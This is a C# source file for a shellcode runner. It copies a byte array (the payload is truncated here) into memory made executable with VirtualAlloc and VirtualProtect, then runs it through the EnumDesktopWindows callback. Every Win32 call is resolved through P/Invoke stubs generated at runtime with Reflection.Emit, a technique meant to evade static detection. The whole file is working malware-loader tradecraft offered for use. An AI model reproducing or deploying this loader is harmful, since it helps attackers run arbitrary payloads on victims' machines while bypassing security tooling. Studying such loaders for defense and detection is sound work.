//Refs:
//https://gist.github.com/nicholasmckinney/a1d63f3f5192b1d2dfbb4ba67b37c729
//https://gist.github.com/TheWover/bf992fb765dc05c62e417eddc010e2ce
//https://dotnetfiddle.net/10b8CQ
//https://github.com/rootSySdk/PowerShellSample/blob/6dc0936ec2e2042c47cc22f57172401485de5739/PInvoke/MessageBoxManual.ps1
//https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/

using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;

namespace DynamicPInvokeDefineMethodShellcodeRunner
{
    public class Program
    {
        public static void Main()
        {
            byte[] shellcode = { 0xfc, 0x48, .. };

            IntPtr funcAddr = VirtualAlloc(
                                  IntPtr.Zero,
                                  (uint)shellcode.Length,
                                  0x1000,
                                  0x04);

            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);

            EnumDesktopWindowsDelegate dwDelegate = (EnumDesktopWindowsDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(EnumDesktopWindowsDelegate));

            UInt32 threadID = GetCurrentThreadId();
            IntPtr threadDesktop = GetThreadDesktop(threadID);

            UInt32 flOldProtect = 0;
            if (VirtualProtect(funcAddr, (UIntPtr)shellcode.Length, 0x20, ref flOldProtect))
            {
                EnumDesktopWindows(threadDesktop, dwDelegate, IntPtr.Zero);
            }
        }

        public static object DynamicPInvokeBuilder(Type type, string library, string method, Object[] args, Type[] paramTypes)
        {
            //Define Dynamic Assembly
            AssemblyName assemblyName = new AssemblyName("zz");
            var assemblyBuilder = AssemblyBuilder.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("zz", false);
            var typeBuilder = moduleBuilder.DefineType(library, TypeAttributes.Public | TypeAttributes.Class);


            //Define PInvoke Method
            var methodBuilder = typeBuilder.DefineMethod(method,
                                                         MethodAttributes.Public | MethodAttributes.Static,
                                                         type,
                                                         paramTypes);


            //Define PInvoke DLL Import & Signature
            ConstructorInfo dllImportConstructorInfo = typeof(DllImportAttribute).GetConstructor(new Type[] { typeof(string) });

            FieldInfo[] dllImportFieldInfo = { typeof(DllImportAttribute).GetField("EntryPoint"),
                                               typeof(DllImportAttribute).GetField("PreserveSig"),
                                               typeof(DllImportAttribute).GetField("SetLastError"),
                                               typeof(DllImportAttribute).GetField("CallingConvention"),
                                               typeof(DllImportAttribute).GetField("CharSet") };

            Object[] dllImportFieldValues = { method,
                                              true,
                                              true,
                                              CallingConvention.Winapi,
                                              CharSet.Unicode};


            //Create and add attributes to method
            CustomAttributeBuilder customAttributeBuilder = new CustomAttributeBuilder(dllImportConstructorInfo, new Object[] { library }, dllImportFieldInfo, dllImportFieldValues);
            methodBuilder.SetCustomAttribute(customAttributeBuilder);

            //Call PInvoke Method
            Type myType = typeBuilder.CreateType();
            object res = myType.InvokeMember(method, BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod, null, null, args);

            return res;
        }

        public static IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(UInt32), typeof(UInt32), typeof(UInt32) };
            Object[] args = { lpAddress, dwSize, flAllocationType, flProtect };
            object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.dll", "VirtualAlloc", args, paramTypes);
            return (IntPtr)res;
        }

        public static bool VirtualProtect(IntPtr hProcess, UIntPtr dwSize, UInt32 flNewProtect, ref UInt32 lpflOldProtect)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(UIntPtr), typeof(UInt32), typeof(UInt32).MakeByRefType() };
            Object[] args = { hProcess, dwSize, flNewProtect, lpflOldProtect };
            object res = DynamicPInvokeBuilder(typeof(bool), "Kernel32.dll", "VirtualProtect", args, paramTypes);
            return (bool)res;
        }

        public static IntPtr GetThreadDesktop(UInt32 dwThreadId)
        {
            Type[] paramTypes = { typeof(UInt32) };
            Object[] args = { dwThreadId };
            object res = DynamicPInvokeBuilder(typeof(IntPtr), "user32.dll", "GetThreadDesktop", args, paramTypes);
            return (IntPtr)res;
        }

        public static UInt32 GetCurrentThreadId()
        {
            Type[] paramTypes = { };
            Object[] args = { };
            object res = DynamicPInvokeBuilder(typeof(UInt32), "Kernel32.dll", "GetCurrentThreadId", args, paramTypes);
            return (UInt32)res;
        }

        public static bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsDelegate lpfn, IntPtr lParam)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(EnumDesktopWindowsDelegate), typeof(IntPtr) };
            Object[] args = { hDesktop, lpfn, lParam };
            object res = DynamicPInvokeBuilder(typeof(bool), "user32.dll", "EnumDesktopWindows", args, paramTypes);
            return (bool)res;
        }

        public delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, int lParam);

    }
}